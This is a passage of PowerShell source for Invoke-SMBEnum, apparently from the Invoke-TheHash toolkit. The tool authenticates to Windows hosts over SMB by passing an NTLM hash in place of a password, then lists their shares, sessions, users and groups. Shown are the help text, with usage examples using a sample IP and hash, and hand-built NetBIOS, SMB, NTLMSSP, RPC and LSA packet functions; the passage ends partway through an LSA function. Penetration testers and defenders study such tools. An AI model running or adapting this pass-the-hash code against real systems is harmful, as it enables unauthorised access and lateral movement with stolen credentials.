function Invoke-SMBEnum
{
<#
.SYNOPSIS
Invoke-SMBEnum performs enumeration tasks over SMB with NTLMv2 pass the hash authentication. Invoke-SMBEnum
supports SMB2 with and without SMB signing.

Author: Kevin Robertson (@kevin_robertson)
License: BSD 3-Clause

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Action
(All,Group,NetSession,Share,User) Default = Share: Enumeration action to perform.

.PARAMETER Group
Default = Administrators: Group to enumerate.

.PARAMETER Sleep
Default = 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.PARAMETER Session
Inveigh-Relay authenticated session.

.PARAMETER SigningCheck
(Switch) Checks to see if SMB signing is required on a target.

.EXAMPLE
List shares.
Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
List NetSessions.
Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action NetSession

.EXAMPLE
List local users using an authenticated Inveigh-Relay session.
Invoke-SMBEnum -Session 1 -Action User

.EXAMPLE
Check if SMB signing is required.
Invoke-SMBEnum -Target 192.168.100.20 -SigningCheck

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Target,
    [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Default',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][ValidateSet("All","NetSession","Share","User","Group")][String]$Action = "All",
    [parameter(ParameterSetName='Default',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][String]$Group = "Administrators",
    [parameter(ParameterSetName='Default',Mandatory=$false)][Switch]$SigningCheck,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)

function ConvertFrom-PacketOrderedDictionary
{
    param($OrderedDictionary)

    ForEach($field in $OrderedDictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}

function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($Version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$NamedPipe)

    $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequestFile.Add("NameLength",$name_length)
    $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)

    return $SMB2CreateRequestFile
}

function New-PacketSMB2QueryInfoRequest
{
    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$OutputBufferLength,[Byte[]]$InputBufferOffset,[Byte[]]$FileID,[Int]$Buffer)

    [Byte[]]$buffer_bytes = ,0x00 * $Buffer

    $SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))
    $SMB2QueryInfoRequest.Add("InfoType",$InfoType)
    $SMB2QueryInfoRequest.Add("FileInfoClass",$FileInfoClass)
    $SMB2QueryInfoRequest.Add("OutputBufferLength",$OutputBufferLength)
    $SMB2QueryInfoRequest.Add("InputBufferOffset",$InputBufferOffset)
    $SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("FileID",$FileID)

    if($Buffer -gt 0)
    {
        $SMB2QueryInfoRequest.Add("Buffer",$buffer_bytes)
    }

    return $SMB2QueryInfoRequest
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$write_length)
    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

function New-PacketSMB2IoctlRequest
{
    param([Byte[]]$Function,[Byte[]]$FileName,[Int]$Length,[Int]$OutSize)

    [Byte[]]$indata_length = [System.BitConverter]::GetBytes($Length + 24)
    [Byte[]]$out_size = [System.BitConverter]::GetBytes($OutSize)

    $SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2IoctlRequest.Add("Function",$Function)
    $SMB2IoctlRequest.Add("GUIDHandle",$FileName)
    $SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("InData_Length",$indata_length)
    $SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("MaxIoctlOutSize",$out_size)
    $SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))

    if($out_size -eq 40)
    {
        $SMB2IoctlRequest.Add("InData_Capabilities",[Byte[]](0x7f,0x00,0x00,0x00))
        $SMB2IoctlRequest.Add("InData_ClientGUID",[Byte[]](0xc7,0x11,0x73,0x1e,0xa5,0x7d,0x39,0x47,0xaf,0x92,0x2d,0x88,0xc0,0x44,0xb1,0x1e))
        $SMB2IoctlRequest.Add("InData_SecurityMode",[Byte[]](0x01))
        $SMB2IoctlRequest.Add("InData_Unknown",[Byte[]](0x00))
        $SMB2IoctlRequest.Add("InData_DialectCount",[Byte[]](0x02,0x00))
        $SMB2IoctlRequest.Add("InData_Dialect",[Byte[]](0x02,0x02))
        $SMB2IoctlRequest.Add("InData_Dialect2",[Byte[]](0x10,0x02))
    }

    return $SMB2IoctlRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}

#RPC

function New-PacketRPCBind
{
    param([Byte[]]$FragLength,[Int]$CallID,[Byte[]]$NumCtxItems,[Byte[]]$ContextID,[Byte[]]$UUID,[Byte[]]$UUIDVersion)

    [Byte[]]$call_ID = [System.BitConverter]::GetBytes($CallID)

    $RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCBind.Add("Version",[Byte[]](0x05))
    $RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $RPCBind.Add("PacketType",[Byte[]](0x0b))
    $RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCBind.Add("FragLength",$FragLength)
    $RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $RPCBind.Add("CallID",$call_ID)
    $RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $RPCBind.Add("NumCtxItems",$NumCtxItems)
    $RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $RPCBind.Add("ContextID",$ContextID)
    $RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $RPCBind.Add("Unknown2",[Byte[]](0x00))
    $RPCBind.Add("Interface",$UUID)
    $RPCBind.Add("InterfaceVer",$UUIDVersion)
    $RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($NumCtxItems[0] -eq 2)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($NumCtxItems[0] -eq 3)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $RPCBind.Add("Unknown4",[Byte[]](0x00))
        $RPCBind.Add("Interface3",$UUID)
        $RPCBind.Add("InterfaceVer3",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
    }

    if($call_ID -eq 3)
    {
        $RPCBind.Add("AuthType",[Byte[]](0x0a))
        $RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $RPCBind
}

function New-PacketRPCRequest
{
    param([Byte[]]$Flags,[Int]$ServiceLength,[Int]$AuthLength,[Int]$AuthPadding,[Byte[]]$CallID,[Byte[]]$ContextID,[Byte[]]$Opnum,[Byte[]]$Data)

    if($AuthLength -gt 0)
    {
        $full_auth_length = $AuthLength + $AuthPadding + 8
    }

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($ServiceLength + 24 + $full_auth_length + $Data.Length)
    [Byte[]]$frag_length = $write_length[0,1]
    [Byte[]]$alloc_hint = [System.BitConverter]::GetBytes($ServiceLength + $Data.Length)
    [Byte[]]$auth_length = ([System.BitConverter]::GetBytes($AuthLength))[0,1]

    $RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCRequest.Add("Version",[Byte[]](0x05))
    $RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $RPCRequest.Add("PacketType",[Byte[]](0x00))
    $RPCRequest.Add("PacketFlags",$Flags)
    $RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCRequest.Add("FragLength",$frag_length)
    $RPCRequest.Add("AuthLength",$auth_length)
    $RPCRequest.Add("CallID",$CallID)
    $RPCRequest.Add("AllocHint",$alloc_hint)
    $RPCRequest.Add("ContextID",$ContextID)
    $RPCRequest.Add("Opnum",$Opnum)

    if($data.Length)
    {
        $RPCRequest.Add("Data",$Data)
    }

    return $RPCRequest
}

# LSA
function New-PacketLSAOpenPolicy
{
    $LSAOpenPolicy = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAOpenPolicy.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $LSAOpenPolicy.Add("PointerToSystemName_System",[Byte[]](0x5c,0x00))
    $LSAOpenPolicy.Add("PointerToSystemName_Unknown",[Byte[]](0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_Len",[Byte[]](0x18,0x00,0x00,0x00))
